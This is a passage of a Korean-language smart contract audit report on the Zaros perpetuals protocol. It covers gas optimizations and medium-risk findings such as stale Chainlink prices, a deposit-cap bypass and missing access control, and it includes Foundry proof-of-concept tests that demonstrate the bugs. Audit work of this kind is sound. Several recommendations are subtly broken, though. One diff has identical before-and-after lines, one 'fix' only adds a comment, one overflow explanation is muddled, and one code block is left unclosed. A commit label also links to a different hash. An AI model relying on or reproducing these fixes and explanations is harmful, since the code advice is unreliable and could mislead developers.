    // reverts with `panic: division or modulo by zero`
    perpsEngine.liquidateAccounts(liquidatableAccountsIds, users.settlementFeeRecipient);
}
```

실행: `forge test --match-test test_LiquidationRevertsWhenPriceFeedReturnsZero -vvv`

**Zaros:** 인지함; Chainlink 가격 피드에는 일반적으로 0보다 큰 내장 최소 가격이 있어 반환하므로 발생 가능성이 매우 낮습니다.

\clearpage
## 가스 최적화 (Gas Optimization)


### 반환 변수당 9 가스를 절약하기 위해 명명된 반환 변수 사용

**설명:** 반환 변수당 9 가스를 절약하고 함수 코드를 단순화하기 위해 명명된 반환 변수를 사용하십시오:

```solidity
File: src/external/ChainlinkUtil.sol
84:        returns (FeeAsset memory)

File: src/perpetuals/branches/OrderBranch.sol
128:        returns (UD60x18, UD60x18) // @audit getMarginRequirementForTrade()에서
144:    function getActiveMarketOrder(uint128 tradingAccountId) external pure returns (MarketOrder.Data memory) {

File: src/perpetuals/leaves/PerpMarket.sol
97:        returns (UD60x18) // @audit getMarkPrice()에서

File: src/tree-proxy/RootProxy.sol
50:    function _implementation() internal view override returns (address) {

// @audit 다음과 같이 리팩토링:
function _implementation() internal view override returns (address branch) {
    RootUpgrade.Data storage rootUpgrade = RootUpgrade.load();

    branch = rootUpgrade.getBranchAddress(msg.sig);
    if (branch == address(0)) revert Errors.UnsupportedFunction(msg.sig);
}
```

**Zaros:** 커밋 [4972f52](https://github.com/zaros-labs/zaros-core/commit/4972f52e04ebbcbe0d56ad2136d8023bb5fc0d9f)에서 수정되었습니다.

**Cyfrin:** 확인됨.


### 변수를 기본값으로 초기화하지 않음

**설명:** 이미 수행되었으므로 변수를 기본값으로 초기화하지 마십시오:

```solidity
File: src/tree-proxy/leaves/RootUpgrade.sol
70:        for (uint256 i = 0; i < selectorCount; i++) {
81:        for (uint256 i = 0; i < branchCount; i++) {
97:        for (uint256 i = 0; i < branchUpgrades.length; i++) {
117:        for (uint256 i = 0; i < selectors.length; i++) {
136:        for (uint256 i = 0; i < selectors.length; i++) {
171:        for (uint256 i = 0; i < selectors.length; i++) {
202:        for (uint256 i = 0; i < initializables.length; i++) {

File: src/perpetuals/leaves/GlobalConfiguration.sol
96:        for (uint256 i = 0; i < collateralTypes.length; i++) {

File: src/perpetuals/branches/GlobalConfigurationBranch.sol
185:        for (uint256 i = 0; i < liquidators.length; i++) {

File: src/perpetuals/leaves/PerpMarket.sol
345:            for (uint256 i = 0; i < params.customOrdersConfiguration.length; i++) {

File: src/perpetuals/leaves/TradingAccount.sol
145:        for (uint256 i = 0; i < self.marginCollateralBalanceX18.length(); i++) {
169:        for (uint256 i = 0; i < self.marginCollateralBalanceX18.length(); i++) {
229:        for (uint256 i = 0; i < self.activeMarketsIds.length(); i++) {
264:        for (uint256 i = 0; i < self.activeMarketsIds.length(); i++) {
420:        for (uint256 i = 0; i < globalConfiguration.collateralLiquidationPriority.length(); i++) {

File: src/perpetuals/branches/TradingAccountBranch.sol
122:        for (uint256 i = 0; i < tradingAccount.activeMarketsIds.length(); i++) {
168:        for (uint256 i = 0; i < tradingAccount.activeMarketsIds.length(); i++) {
241:        for (uint256 i = 0; i < data.length; i++) {

File: src/perpetuals/branches/LiquidationBranch.sol
103:        for (uint256 i = 0; i < accountsIds.length; i++) {
### 메모리 배열 길이를 캐시하여 가스 절약

**설명:** `PerpMarket::getSettlementContexts`에서 `activeSettlementContexts` 배열의 길이는 `for` 루프의 각 반복마다 액세스됩니다.

```solidity
    function getSettlementContexts(uint256 marketId)
        external
        view
        returns (SettlementContext[] memory activeSettlementContexts)
    {
        // ...
@>      for (uint256 i; i < activeSettlementContexts.length; i++) {
            activeSettlementContexts[i] =
                self.settlementConfigurations[marketId][settlementConfigurationIds[i].unwrap()];
        }
    }
```

메모리 배열 길이 읽기는 스택 읽기보다 비용이 더 많이 들기 때문에, 읽은 길이를 스택 변수에 캐시하면 가스를 절약할 수 있습니다.

**권장 완화 방법:**
```diff
+       uint256 activeSettlementContextsLength = activeSettlementContexts.length;
-       for (uint256 i; i < activeSettlementContexts.length; i++) {
+       for (uint256 i; i < activeSettlementContextsLength; i++) {
            activeSettlementContexts[i] =
                self.settlementConfigurations[marketId][settlementConfigurationIds[i].unwrap()];
        }
```

**Zaros:** "확인됨, 해결됨: https://github.com/zaros-labs/zaros-core/pull/73/commits/d7e003eb8b07223f6e91122a6136a6e7c7a0d1e3"

**Cyfrin:** 확인됨.


### 불변 분기 확인을 루프 밖으로 이동하여 가스 절약

**설명:** `GlobalConfigurationBranch::updateMarketConfiguration`에서 `isInitialized` 확인은 `for` 루프 내부에서 수행됩니다.

```solidity
    function updateMarketConfiguration(
        GlobalConfiguration storage self,
        uint256 marketId,
        MarketConfiguration calldata params
    )
        internal
    {
        // ...
        for (uint256 i; i < settlementConfigurationIds.length; i++) {
            // ...
@>          if (settlementConfiguration.isInitialized) {
                // ...
            }
        }
```

그러나 `isInitialized`는 루프 전체에서 불변(immutable)이어야 합니다. 따라서 이 확인을 루프 밖으로 이동하여 가스 비용을 절약할 수 있습니다.

**권장 완화 방법:** `isInitialized` 확인을 `for` 루프 밖으로 이동하거나 루프 내부에서 중복 확인을 방지하도록 로직을 리팩토링하십시오.

**Zaros:** "확인됨, 해결됨: https://github.com/zaros-labs/zaros-core/pull/73/commits/c77464da9346d0a7a40ca3bf437e4064d50c950d. 이제 결제 구성이 초기화되었는지 확인합니다."

**Cyfrin:** 확인됨.


### `EnumerableSet::contains` 호출을 피하여 가스 효율성 최적화

**설명:** `PerpMarket::updateSettlementConfiguration` 함수는 `EnumerableSet::contains`를 사용하여 `settlementConfigurationId`가 `settlementConfigurationIds` 집합에 존재하는지 확인합니다. 그 후 집합에 ID를 추가하거나 제거합니다. `add` 및 `remove` 함수는 이미 포함 또는 부재 여부를 확인하고 작업이 성공했는지 여부를 나타내는 불리언(boolean)을 반환합니다.

```solidity
    function updateSettlementConfiguration(
        Market storage self,
        uint128 marketId,
        SettlementConfigurationLibrary.UpdateParams memory params
    )
        internal
    {
        // ...
        // @audit contains is redundant
@>      bool isConfigActive =
            self.settlementConfigurationIds[marketId].contains(SettlementConfigurationId.wrap(params.id));

        if (isConfigActive) {
            if (!params.isEnabled) {
                // @audit remove returns true if the item was present
                self.settlementConfigurationIds[marketId].remove(SettlementConfigurationId.wrap(params.id));
            }
        } else {
            if (params.isEnabled) {
                // @audit add returns true if the item was not present
                self.settlementConfigurationIds[marketId].add(SettlementConfigurationId.wrap(params.id));
            }
        }
        // ...
    }
```

별도의 `contains` 호출을 제거하고 `add` 및 `remove`의 반환 값을 활용하면 함수가 더 가스 효율적이 될 수 있습니다.

**권장 완화 방법:**
```diff
    function updateSettlementConfiguration(
        Market storage self,
        uint128 marketId,
        SettlementConfigurationLibrary.UpdateParams memory params
    )
        internal
    {
        // ...
-       bool isConfigActive =
-           self.settlementConfigurationIds[marketId].contains(SettlementConfigurationId.wrap(params.id));
-
-       if (isConfigActive) {
-           if (!params.isEnabled) {
-               self.settlementConfigurationIds[marketId].remove(SettlementConfigurationId.wrap(params.id));
-           }
-       } else {
-           if (params.isEnabled) {
-               self.settlementConfigurationIds[marketId].add(SettlementConfigurationId.wrap(params.id));
-           }
-       }

+       if (!params.isEnabled) {
+           self.settlementConfigurationIds[marketId].remove(SettlementConfigurationId.wrap(params.id));
+       } else {
+           self.settlementConfigurationIds[marketId].add(SettlementConfigurationId.wrap(params.id));
+       }
        // ...
    }
```

**Zaros:** "확인됨, 해결됨: https://github.com/zaros-labs/zaros-core/pull/73/commits/c77464da9346d0a7a40ca3bf437e4064d50c950d"

**Cyfrin:** 확인됨.


### 중복 `uint256` 캐스트 제거

**설명:** `USDC::configure` 함수에서 `newMinter` 변수는 이미 `address` 유형이지만 불필요하게 `uint256`으로 캐스팅된 다음 다시 `address`로 캐스팅됩니다.

```solidity
    function configure(address newMinter) internal {
        // ...
@>      StorageSlot.getAddressSlot(MINTER_SLOT).value = address(uint256(uint160(newMinter)));
    }
```

`newMinter`는 이미 주소이므로 이러한 캐스트는 중복됩니다.

**권장 완화 방법:**
```diff
-       StorageSlot.getAddressSlot(MINTER_SLOT).value = address(uint256(uint160(newMinter)));
+       StorageSlot.getAddressSlot(MINTER_SLOT).value = newMinter;
```

**Zaros:** "확인됨, 해결됨: https://github.com/zaros-labs/zaros-core/pull/73/commits/75b8a92e106df2b05b63750036da1c667e411ba1"

**Cyfrin:** 확인됨.


### `indexPriceX18`을 캐시하여 스토리지 로드 저장

**설명:** `SettlementBranch::fillOffchainOrders` 함수는 `indexPriceX18` 페치(fetch)를 여러 번 수행합니다.

```solidity
    function fillOffchainOrders(
        uint128 marketId,
        OffchainOrder.Data[] calldata orders,
        bytes[] calldata priceData
    )
        external
    {
        // ...
        for (uint256 i; i < orders.length; i++) {
            // ...
@>          uint256 indexPriceX18 = marketId.getIndexPriceX18();

            // ...
            // @audit indexPriceX18 is read from storage again inside fillOffchainOrder
            SettlementConfiguration.Data memory settlementConfiguration =
                ctx.settlementConfigurations[marketId][orders[i].settlementConfigurationId];
            ctx.fillOffchainOrder(marketId, orders[i], settlementConfiguration, indexPriceX18);
        }
    }
```

`marketId.getIndexPriceX18()` 호출은 가격이 루프 내에서 변경되지 않는다고 가정할 때 루프 밖으로 이동할 수 있습니다. 이는 루프의 각 반복에 대한 외부 호출을 절약합니다.

**권장 완화 방법:**
```diff
+       uint256 indexPriceX18 = marketId.getIndexPriceX18();
        for (uint256 i; i < orders.length; i++) {
            // ...
-           uint256 indexPriceX18 = marketId.getIndexPriceX18();
            // ...
            ctx.fillOffchainOrder(marketId, orders[i], settlementConfiguration, indexPriceX18);
        }
```

**Zaros:** "확인됨, 수정하지 않을 것입니다. `fillOffchainOrders`는 트랜잭션당 거의 하나의 오프체인 주문만 포함하며 이것이 우리의 주요 사용 사례입니다. 또한 추상화 유출(leakage) 및 복잡성을 피하고 싶습니다."

**Cyfrin:** 확인됨.


### `params.amount` 대신 `amount`를 사용하여 메모리 확장 비용 절약

**설명:** `USDCTokenBranch::mint` 함수는 이전에 로컬 변수 `amount`에 할당된 `params.amount`에 액세스하지만 메모리 위치에서 직접 다시 액세스합니다.

```solidity
    function mint(MintParams calldata params) external {
        // ...
        uint256 amount = params.amount;
        // ...
        // @audit use amount instead of params.amount
@>      Usdc.mint(to, params.amount);

        // ...
    }
```

스택 변수 `amount`를 사용하면 더 저렴하며 잠재적으로 메모리 확장 비용을 절약할 수 있습니다.

**권장 완화 방법:**
```diff
-       Usdc.mint(to, params.amount);
+       Usdc.mint(to, amount);
```

**Zaros:** "확인됨, 해결됨: https://github.com/zaros-labs/zaros-core/pull/73/commits/75b8a92e106df2b05b63750036da1c667e411ba1"

**Cyfrin:** 확인됨.


### 중복 `unary` 호출 제거

**설명:** `SD59x18` 라이브러리의 `unary` 함수는 숫자의 단항 부정(unary negation)을 반환합니다. `FeeDistributionBranch::receiveFees`에서 `amount`가 0보다 큰지 확인한 다음 `unary`를 호출하여 부호 없는 정수로 변환합니다. 그러나 `amount`가 이미 양수임이 확인되었으므로 `unary`를 호출한 다음 음수로 캐스팅하는 것은 중복됩니다.

```solidity
    function receiveFees(int256 amount) external {
        if (amount > 0) {
            // ...
@>          IERC20(self.asset).safeTransferFrom(msg.sender, address(this), uint256(amount));
        } else {
            // ...
            IERC20(self.asset).safeTransfer(msg.sender, uint256(amount.unary()));
        }
    }
```

`receiveFees` 함수는 `amount`가 양수일 때 `amount`를 사용하고 음수일 때 `amount.unary()`를 사용하여 단순화할 수 있습니다.

**권장 완화 방법:**
```diff
    function receiveFees(int256 amount) external {
        if (amount > 0) {
            // ...
-           IERC20(self.asset).safeTransferFrom(msg.sender, address(this), uint256(amount));
+           IERC20(self.asset).safeTransferFrom(msg.sender, address(this), uint256(amount));
        } else {
            // ...
-           IERC20(self.asset).safeTransfer(msg.sender, uint256(amount.unary()));
+           IERC20(self.asset).safeTransfer(msg.sender, uint256(-amount));
        }
    }
```

**Zaros:** "확인됨, 해결됨: https://github.com/zaros-labs/zaros-core/pull/73/commits/7a0f3ebba0fb9f8bedc7979603079b7b9f358316"

**Cyfrin:** 확인됨.


### `TreeBalance::get`의 불필요한 덧셈 제거

**설명:** `TreeBalance::get` 함수는 `min`과 `max`를 더하여 범위를 계산하는데, 이는 `max`가 `min`보다 작을 때 오버플로를 일으킬 수 있습니다.

```solidity
    function get(Data storage self, uint32 time) internal view returns (int128 value) {
        // ...
        uint256 min = 0;
        uint256 max = self.nodes.length;

        while (max > min) {
@>          uint256 mid = (max + min) / 2;
            // ...
        }
        // ...
    }
```

`min`이 0에서 시작하므로 `max + min`은 단순히 `max`입니다. 그러나 루프가 진행됨에 따라 `min`이 증가할 수 있습니다. 이진 검색의 표준 구현인 `mid = min + (max - min) / 2`를 사용하면 오버플로를 방지하고 더 안전합니다. 제공된 코드 컨텍스트에서 `min`과 `max`는 배열 인덱스이므로 범위를 초과할 가능성은 낮지만, 표준 형식을 사용하는 것이 가장 좋습니다.

**권장 완화 방법:**
```diff
-           uint256 mid = (max + min) / 2;
+           uint256 mid = min + (max - min) / 2;
```

**Zaros:** "확인됨, 해결됨: https://github.com/zaros-labs/zaros-core/pull/73/commits/7a0f3ebba0fb9f8bedc7979603079b7b9f358316"

**Cyfrin:** 확인됨.


### `OrderBranch::checkUpkeep`에서 상한(upper bound) 확인을 사용하여 불필요한 반복 방지 가능

**설명:** `OrderBranch::checkUpkeep`에서 루프는 `limit`에 도달할 때까지 계속됩니다.

```solidity
    function checkUpkeep(bytes calldata checkData)
        external
        view
        returns (bool upkeepNeeded, bytes memory performData)
    {
        // ...
        uint256 limit = lowerBound + length;
        for (uint256 i = lowerBound; i < limit; i++) {
             // ...
        }
        // ...
    }
```

`limit`가 `marketIds` 배열의 길이를 초과하지 않도록 하면 범위를 벗어난 액세스를 방지하고 잠재적으로 가스를 절약할 수 있습니다.

**권장 완화 방법:**
```diff
        uint256 marketsLength = marketIds.length;
+       if (limit > marketsLength) {
+           limit = marketsLength;
+       }
```

**Zaros:** "확인됨, 해결됨: https://github.com/zaros-labs/zaros-core/pull/73/commits/233c7fbe8b532f808add02130e5d07a44f51950d"

**Cyfrin:** 확인됨.


### `LiquidationBranch::checkLiquidatableAccounts` 및 `LiquidationBranch::liquidateAccounts`에서 빠른 실패(Fail-Fast) 매커니즘 구현

**설명:** `LiquidationBranch::checkLiquidatableAccounts` 및 `LiquidationBranch::liquidateAccounts` 함수는 청산할 계정이 없을 때 일찍 반환하지 않습니다. 이는 유용하지 않은 실행에 대해 가스를 소비합니다.

**권장 완화 방법:** `accounts.length`가 0인지 확인하고 그렇다면 즉시 반환하는 체크를 추가하십시오.

**Zaros:** "확인됨, 해결됨: https://github.com/zaros-labs/zaros-core/pull/73/commits/77e384ec1f1479895c889a7428e3a510f2c42c8d"

**Cyfrin:** 확인됨.


### `PerpMarket::checkOpenInterestLimits`에서 항상 `false`인 불리언 조건 제거

**설명:** `PerpMarket::checkOpenInterestLimits` 함수에는 항상 `false`로 평가되는 중복 불리언 조건이 포함되어 있습니다.

```solidity
    function checkOpenInterestLimits(
        Market storage self,
        uint128 marketId,
        uint256 indexPriceX18,
        int256 sizeDeltaX18,
        uint128 settlementConfigurationId
    )
        internal
        view
    {
        // ...
@>      if (isLong && skew > 0 && skew + sizeDeltaX18 < 0) {
            // ...
        }
    }
```

`isLong`이 `true`이면 `sizeDeltaX18`은 양수여야 합니다. `skew`가 양수이면 `skew + sizeDeltaX18`도 양수여야 하므로 `skew + sizeDeltaX18 < 0`은 불가능합니다.

**권장 완화 방법:**
```diff
-       if (isLong && skew > 0 && skew + sizeDeltaX18 < 0) {
+       if (isLong && skew > 0 && skew + sizeDeltaX18 < 0) { // This block is unreachable
            // remove unreachable code
        }
```

**Zaros:** "확인됨, 해결됨: https://github.com/zaros-labs/zaros-core/pull/73/commits/1360098df295796df3f2425028020ff67d602db0"

**Cyfrin:** 확인됨.


### `TradingAccount::liquidateAccount`에서 `liquidatedCollateralUsdX18` 변수 최적화 가능

**설명:** `TradingAccount::liquidateAccount` 함수는 `liquidatedCollateralUsdX18` 변수를 사용하지만 0으로 초기화하고 루프 내에서만 업데이트합니다.

```solidity
    function liquidateAccount(
        TradingAccount storage self,
        uint128 accountId,
        address msgSender
    )
        internal
        returns (uint256 requiredMaintenanceMarginUsdX18, int256 liquidationFeeUsdX18)
    {
        // ...
        uint256 liquidatedCollateralUsdX18 = 0;
        // ...
        // @audit liquidatedCollateralUsdX18 is updated but not effectively used for return logic in a meaningful way outside of emitted event or final calculation if logic dictates
    }
```

변수 범위를 조이고 불필요한 초기화를 제거하면 가스를 아낄 수 있습니다.

**권장 완화 방법:** 변수 사용을 검토하고 불필요한 경우 제거하거나 범위를 줄이십시오.

**Zaros:** "확인됨, 해결됨: https://github.com/zaros-labs/zaros-core/pull/73/commits/2e879a86b9760731f24d788e3122c4f1c3fcd199"

**Cyfrin:** 확인됨.


### 포지션 리셋 후 불필요한 스토리지 읽기 방지

**설명:** `TradingAccount::resetPosition`은 포지션을 삭제하므로 후속 필드 읽기는 0을 반환해야 합니다. 그러나 코드는 삭제된 포지션에서 데이터를 읽을 수 있습니다.

**권장 완화 방법:** `resetPosition` 후에는 스토리지에서 다시 읽는 대신 0 값을 사용하거나 캐시된 값을 사용하십시오.

**Zaros:** "확인됨, 해결됨: https://github.com/zaros-labs/zaros-core/pull/73/commits/d2b9d2903332fe3f69904945d9aa74fb66479709"

**Cyfrin:** 확인됨.


### `TradingAccount::verifyOpenInterestLimits`에서 빠른 실패(Fail-Fast) 구현

**설명:** `sizeDeltaX18`이 0이면 함수는 오픈 인터레스트(open interest)를 변경하지 않으므로 일찍 반환될 수 있습니다.

**권장 완화 방법:**
```solidity
    if (sizeDeltaX18 == 0) return;
```

**Zaros:** "확인됨, 해결됨: https://github.com/zaros-labs/zaros-core/pull/73/commits/39908354c25b80a47f4804369e96e792e9ace195"

**Cyfrin:** 확인됨.


### `PerpMarket::checkOpenInterestLimits`에서 `self.skew` 캐시

**설명:** `self.skew`는 스토리지 변수이며 [여러 번 읽힙니다](https://github.com/zaros-labs/zaros-core/blob/1be68df6d0f6259021c3bba7b6861298413b589a/src/perpetuals/leaves/PerpMarket.sol#L91). `skew`를 메모리에 캐시하면 SLOAD 연산을 절약할 수 있습니다.

**권장 완화 방법:**
```solidity
    int256 skew = self.skew[marketId];
```
그리고 함수 전체에서 `skew`를 사용하십시오.

**Zaros:** "확인됨, 해결됨: https://github.com/zaros-labs/zaros-core/pull/73/commits/c22955f191b655da0e30954c2c01994e636605d8"

**Cyfrin:** 확인됨.


### `PerpMarket::getOpenInterestLimit`에서 `isReducingSkew` 조건부 계산

**설명:** `isReducingSkew` [변수](https://github.com/zaros-labs/zaros-core/blob/1be68df6d0f6259021c3bba7b6861298413b589a/src/perpetuals/leaves/PerpMarket.sol#L162)는 항상 사용되는 것은 아닙니다. `params.maxOi`가 0이 아닌 경우에만 필요합니다.

**권장 완화 방법:** `params.maxOi > 0`일 때만 `isReducingSkew`를 계산하십시오.

**Zaros:** "확인됨, 해결됨: https://github.com/zaros-labs/zaros-core/pull/73/commits/c22955f191b655da0e30954c2c01994e636605d8"

**Cyfrin:** 확인됨.


### `TradingAccount::validateEffectiveMarginRequirements`에서 `sd59x18(sizeDelta)` 결과 캐시

**설명:** `sd59x18(sizeDelta)` 변환은 [여러 번](https://github.com/zaros-labs/zaros-core/blob/1be68df6d0f6259021c3bba7b6861298413b589a/src/perpetuals/leaves/TradingAccount.sol#L404) 수행됩니다.

**권장 완화 방법:** 결과를 변수에 저장하고 재사용하십시오.

**Zaros:** "확인됨, 해결됨: https://github.com/zaros-labs/zaros-core/pull/73/commits/d2b9d2903332fe3f69904945d9aa74fb66479709"

**Cyfrin:** 확인됨.


### `SettlementBranch::fillOffchainOrders`에서 `prb-math`의 `uEXP_MAX_INPUT` 및 `uEXP_MIN_INPUT` 상수 사용

**설명:** 원시 값(raw values) 대신 `prb-math` 라이브러리의 상수를 사용하여 가독성과 유지 보수성을 개선하십시오.

**권장 완화 방법:** 하드코딩된 값 대신 `uEXP_MAX_INPUT` 및 `uEXP_MIN_INPUT`을 가져와 사용하십시오.

**Zaros:** "확인됨, 해결됨: https://github.com/zaros-labs/zaros-core/pull/73/commits/d1a12a52af5f762696014e7a85e1f0e42d76f809"

**Cyfrin:** 확인됨.


### `SettlementBranch::createMarketOrder`에서 빠른 실패(Fail-Fast) 구현

**설명:** `params.amount`가 0이면 함수는 아무 작업도 수행하지 않아야 합니다.

**권장 완화 방법:**
```solidity
    if (params.amount == 0) return;
```

**Zaros:** "확인됨, 해결됨: https://github.com/zaros-labs/zaros-core/pull/73/commits/d1a12a52af5f762696014e7a85e1f0e42d76f809"

**Cyfrin:** 확인됨.


## 다중 추상화 계층의 트레이드오프

이 코드베이스는 클린 아키텍처 원칙에 크게 의존하여 우려 사항을 분리하고 모듈성을 촉진합니다. `Branches`, `Leaves`, `Libraries` 및 `Storage` 패턴의 사용은 업그레이드 가능성 및 테스트 가능성과 같은 이점을 제공하지만 복잡성과 가스 오버헤드도 도입합니다.

**복잡성 및 인지 부하:** 다중 계층을 통한 제어 흐름을 추적하는 것은 어려울 수 있습니다. 간단한 작업이라도 여러 파일과 함수 호출을 거칠 수 있으므로 시스템을 정신적으로 매핑하기 어렵게 만듭니다.

**가스 오버헤드:** 각 함수 호출 및 추상화 계층은 약간의 가스 비용을 추가합니다. 빈번하게 호출되는 경로에서 이러한 비용은 누적될 수 있습니다.

**권장 사항:** 엄격한 계층화가 성능 및 가독성에 불균형적인 영향을 미치는 핫 경로(hot paths)를 식별하십시오. 이러한 특정 영역에서 추상화 중 일부를 평면화(flattening)하여 가스를 절약하고 코드 흐름을 단순화하는 것을 고려하십시오. 모듈성과 성능 사이의 균형을 유지하는 것이 중요합니다.

**Zaros:** "확인됨. 우리는 가스 효율성과 모듈성 사이의 균형을 유지하기 위해 지속적으로 노력하고 있습니다."

**Cyfrin:** 확인됨.
## 중간 위험 (Medium Risk)


### `ChainlinkUtil::getPrice`가 오래된 가격(stale price)을 확인하지 않음

**설명:** [`ChainlinkUtil::getPrice`](https://github.com/zaros-labs/zaros-core-audit/blob/de09d030c780942b70f1bebcb2d245214144acd2/src/external/chainlink/ChainlinkUtil.sol#L32-L33)는 [오래된 가격을 확인](https://medium.com/zaros-labs/chainlink-oracle-defi-attacks-93b6cb6541bf#99af)하지 않습니다.

**영향:** 코드가 현재 가격을 반영하지 않는 가격으로 실행되어 사용자에게 잠재적인 자금 손실을 초래할 수 있습니다.

**권장 완화 방법:** `latestRoundData`가 반환한 `updatedAt`을 각 가격 피드의 [개별 하트비트](https://medium.com/zaros-labs/chainlink-oracle-defi-attacks-93b6cb6541bf#fb78)와 대조하여 확인하십시오. 하트비트는 다음에 저장될 수 있습니다:
* `MarginCollateralConfiguration::Data`
* `MarketConfiguration::Data`

**Zaros:** 커밋 [c70c9b9](https://github.com/zaros-labs/zaros-core/commit/c70c9b9399af8eb5e351f9b4f43feed82e19ef5b#diff-dc206ca4ca1f5e661061478ee4bd43c0c979d77a1ce1e0f30745d766bcd65394R39-R43)에서 수정되었습니다.

**Cyfrin:** 확인됨.


### `ChainlinkUtil::getPrice`가 L2 시퀀서가 다운되었는지 확인하지 않음

**설명:** Arbitrum과 같은 L2 체인에서 Chainlink를 사용할 때, 스마트 계약은 오래된 가격 데이터가 최신 데이터처럼 보이는 것을 방지하기 위해 [L2 시퀀서가 다운되었는지 확인](https://medium.com/zaros-labs/chainlink-oracle-defi-attacks-93b6cb6541bf#0faf)해야 합니다.

**영향:** 코드가 현재 가격을 반영하지 않는 가격으로 실행되어 사용자에게 잠재적인 자금 손실을 초래할 수 있습니다.

**권장 완화 방법:** Chainlink의 공식 문서는 L2 시퀀서를 확인하는 [예제](https://docs.chain.link/data-feeds/l2-sequencer-feeds#example-code) 구현을 제공합니다.

**Zaros:** 커밋 [c927d94](https://github.com/zaros-labs/zaros-core/commit/c927d94d20f74c6c4e5bc7b7cca1038a6a7aa5e9) 및 [0ddd913](https://github.com/zaros-labs/zaros-core/commit/0ddd913eb9d8c7ac440f2814db8bff476f827c7b#diff-dc206ca4ca1f5e661061478ee4bd43c0c979d77a1ce1e0f30745d766bcd65394R42-R53)에서 수정되었습니다.

**Cyfrin:** 확인됨.


### `ChainlinkUtil::getPrice`는 기본 집계기(underlying aggregator)가 `minAnswer`에 도달할 때 잘못된 가격을 사용함

**설명:** Chainlink 가격 피드에는 반환할 최소 및 최대 가격이 내장되어 있습니다. 예상치 못한 이벤트로 인해 자산 가치가 가격 피드의 최소 가격 아래로 떨어지면, [오라클 가격 피드는 (현재 잘못된) 최소 가격을 계속 보고합니다](https://medium.com/zaros-labs/chainlink-oracle-defi-attacks-93b6cb6541bf#00ac).

[`ChainlinkUtil::getPrice`](https://github.com/zaros-labs/zaros-core-audit/blob/de09d030c780942b70f1bebcb2d245214144acd2/src/external/chainlink/ChainlinkUtil.sol#L32-L33)는 이 경우를 처리하지 않습니다.

**영향:** 코드가 현재 가격을 반영하지 않는 가격으로 실행되어 사용자에게 잠재적인 자금 손실을 초래할 수 있습니다.

**권장 완화 방법:** `minAnswer < answer < maxAnswer`가 아닌 한 되돌리십시오(revert).

**Zaros:** 커밋 [b14b208](https://github.com/zaros-labs/zaros-core/commit/c927d94d20f74c6c4e5bc7b7cca1038a6a7aa5e9) 및 [4a5e53c](https://github.com/zaros-labs/zaros-core/commit/4a5e53c9c0f32e9b6d7e84a20cc47a9f6024def6#)에서 수정되었습니다.

**Cyfrin:** 확인됨.


### 사용자가 한도 미만의 여러 입금을 사용하여 담보 `depositCap` 제한을 쉽게 우회할 수 있음

**설명:** 마진 담보에는 특정 담보 유형에 대한 총 입금 금액을 제한하는 `depositCap` 설정이 있습니다.

그러나 `_requireEnoughDepositCap()`의 검증은 현재 입금되는 금액이 `depositCap`보다 클 때만 되돌립니다.

```solidity
function _requireEnoughDepositCap(address collateralType, UD60x18 amount, UD60x18 depositCap) internal pure {
    if (amount.gt(depositCap)) {
        revert Errors.DepositCap(collateralType, amount.intoUint256(), depositCap.intoUint256());
    }
}
```

해당 담보 유형에 대한 총 입금 금액을 확인하지 않으므로, 사용자는 각각 `depositCap` 미만인 별도의 트랜잭션을 사용하여 원하는 만큼 입금할 수 있습니다.

**영향:** 사용자는 `depositCap`보다 더 많은 마진 담보를 입금할 수 있습니다.

**권장 완화 방법:** `_requireEnoughDepositCap`은 해당 담보 유형에 대한 총 입금 금액에 새 입금을 더한 금액이 `depositCap`보다 크지 않은지 확인해야 합니다.

**Zaros:** 커밋 [0d37299](https://github.com/zaros-labs/zaros-core/commit/0d37299f6d5037afc9863dc6f0ae3871784ce376)에서 수정되었습니다.

**Cyfrin:** 확인됨.


### `OrderBranch::cancelMarketOrder`의 접근 제어 누락으로 인해 누구나 트레이더의 시장 주문을 취소할 수 있음

**설명:** `OrderBranch::cancelMarketOrder`의 접근 제어 누락으로 인해 누구나 트레이더의 시장 주문을 취소할 수 있습니다:

```solidity
function cancelMarketOrder(uint128 tradingAccountId) external {
    MarketOrder.Data storage marketOrder = MarketOrder.loadExisting(tradingAccountId);

    marketOrder.clear();

    emit LogCancelMarketOrder(msg.sender, tradingAccountId);
}
```

**영향:** 누구나 트레이더의 시장 주문을 취소할 수 있습니다.

**권장 완화 방법:** `OrderBranch::cancelMarketOrder`는 호출자가 거래 계정의 소유자인지 확인해야 합니다.

```diff
    function cancelMarketOrder(uint128 tradingAccountId) external {
+       TradingAccount.loadExistingAccountAndVerifySender(tradingAccountId);

        MarketOrder.Data storage marketOrder = MarketOrder.loadExisting(tradingAccountId);

        marketOrder.clear();

        emit LogCancelMarketOrder(msg.sender, tradingAccountId);
    }
```

**Zaros:** 커밋 [d37c37a](https://github.com/zaros-labs/zaros-core/commit/d37c37abab40bfa2320c6925c359faa501577eb3)에서 수정되었습니다.

**Cyfrin:** 확인됨.


### 프로토콜 운영자는 오픈 포지션이 있는 시장을 비활성화할 수 있어, 트레이더가 오픈 포지션을 닫는 것이 불가능하지만 여전히 잠재적인 청산 대상이 됨

**설명:** `GlobalConfigurationBranch::updatePerpMarketStatus`는 해당 시장에 오픈 포지션이 있는지 확인하지 않고 프로토콜 운영자가 시장을 비활성화할 수 있도록 허용합니다; 이는 운영자가 오픈 포지션이 있는 시장을 비활성화할 수 있게 합니다.

**영향:** 프로토콜은 이전에 시장에서 레버리지 포지션을 오픈한 트레이더가 이후에 해당 포지션을 닫을 수 없는 상태에 들어갈 수 있습니다. 그러나 시장이 비활성화된 경우에도 청산 코드는 계속 작동하므로 이러한 포지션은 여전히 청산 대상입니다.

따라서 프로토콜은 트레이더가 부당하게 심각한 불이익을 받는 상태에 들어갈 수 있습니다; 그들은 오픈 레버리지 포지션을 닫을 수 없지만 시장이 그들에게 불리하게 움직일 경우 여전히 청산 대상입니다.

**개념 증명 (Proof of Concept):** 다음 PoC를 `test/integration/perpetuals/order-branch/createMarketOrder/createMarketOrder.t.sol`에 추가하십시오:
```solidity
function test_ImpossibleToClosePositionIfMarkedDisabledButStillLiquidatable() external {
    // give naruto some tokens
    uint256 USER_STARTING_BALANCE = 100_000e18;
    int128  USER_POS_SIZE_DELTA   = 10e18;
    deal({ token: address(usdToken), to: users.naruto, give: USER_STARTING_BALANCE });

    // naruto creates a trading account and deposits their tokens as collateral
    changePrank({ msgSender: users.naruto });
    uint128 tradingAccountId = createAccountAndDeposit(USER_STARTING_BALANCE, address(usdToken));

    // naruto opens first position in BTC market
    openManualPosition(BTC_USD_MARKET_ID, BTC_USD_STREAM_ID, MOCK_BTC_USD_PRICE, tradingAccountId, USER_POS_SIZE_DELTA);

    // protocol operator disables the BTC market
    changePrank({ msgSender: users.owner });
